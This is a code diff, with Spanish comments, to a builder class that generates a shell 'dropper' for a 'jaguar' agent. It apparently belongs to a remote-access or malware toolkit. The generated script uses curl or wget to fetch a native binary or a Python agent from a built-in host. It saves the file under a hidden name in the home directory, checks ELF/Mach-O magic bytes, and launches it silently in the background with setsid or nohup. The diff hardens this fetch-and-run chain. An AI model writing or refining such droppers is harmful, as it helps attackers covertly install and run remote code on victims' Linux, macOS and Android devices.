@@ -615,7 +615,9 @@ class Constructor:
         """Dropper shell: funciona en Linux, macOS y Termux (Android).
 
         Prioridad: binario local del SO -> .py con host incrustado.
-        Detecta python3/python y curl/wget. Se desprende con nohup/setsid.
+        Verifica el magic (ELF/Mach-O) antes de lanzar el binario: el agente NO
+        soporta '--version', asi que comprobar con esa bandera bloquearia el
+        dropper para siempre.
         """
         nombre_py = self.nombre + ".py"
         L = [
@@ -625,26 +627,27 @@ class Constructor:
             f'URL_PY="{self._url(nombre_py)}"',
             'DEST="$HOME/.jaguar_agente.py"',
             'BIN="$HOME/.jaguar_agente_bin"',
-            'AGO="--jaguar-detached"',
             "",
             "_bajar() {",
-            '  if command -v curl >/dev/null 2>&1; then curl -fsSL "$1" -o "$2" 2>/dev/null; return $?; fi',
-            '  if command -v wget >/dev/null 2>&1; then wget -qO "$2" "$1" 2>/dev/null; return $?; fi',
-            '  return 1',
+            '  if command -v curl >/dev/null 2>&1; then curl -fsSL "$1" -o "$2" 2>/dev/null && return 0; fi',
+            '  if command -v wget >/dev/null 2>&1; then wget -qO "$2" "$1" 2>/dev/null && return 0; fi',
+            "  return 1",
             "}",
             "",
-            "# 1) binario nativo del SO (si el builder lo genero para esta plataforma)",
+            '_magic() { od -An -tx1 -N4 "$1" 2>/dev/null | tr -d " \\n"; }',
+            "",
+            "# 1) binario nativo del SO (solo si el magic es ELF o Mach-O)",
             'if _bajar "$URL_BIN" "$BIN" && [ -s "$BIN" ]; then',
             '  chmod +x "$BIN" 2>/dev/null',
-            '  if "$BIN" --version >/dev/null 2>&1 || true; then',
-            '    (setsid "$BIN" $AGO >/dev/null 2>&1 &) 2>/dev/null || '
-            '(nohup "$BIN" $AGO >/dev/null 2>&1 &)',
-            "    exit 0",
-            "  fi",
+            '  case "$(_magic "$BIN")" in',
+            '    7f454c46|cffaedfe|cefaedfe|feedfacf|feedface)',
+            '      (setsid "$BIN" >/dev/null 2>&1 &) 2>/dev/null || (nohup "$BIN" >/dev/null 2>&1 &)',
+            "      exit 0 ;;",
+            "  esac",
             "fi",
             "",
-            "# 2) fallback universal: el .py",
-            "PY=\"\"",
+            "# 2) fallback universal: el .py con host incrustado",
+            'PY=""',
             'for c in python3 python; do command -v $c >/dev/null 2>&1 && PY=$c && break; done',
             'if [ -z "$PY" ]; then',
             '  echo "[jaguar] no hay python; instala python3 y reintenta"',
@@ -652,8 +655,8 @@ class Constructor:
             "fi",
             '_bajar "$URL_PY" "$DEST" || exit 1',
             'chmod +x "$DEST" 2>/dev/null',
-            '(setsid "$PY" "$DEST" $AGO >/dev/null 2>&1 &) 2>/dev/null || '
-            'nohup "$PY" "$DEST" $AGO >/dev/null 2>&1 &',
+            '(setsid "$PY" "$DEST" >/dev/null 2>&1 &) 2>/dev/null || '
+            'nohup "$PY" "$DEST" >/dev/null 2>&1 &',
             "exit 0",
             "",
         ]
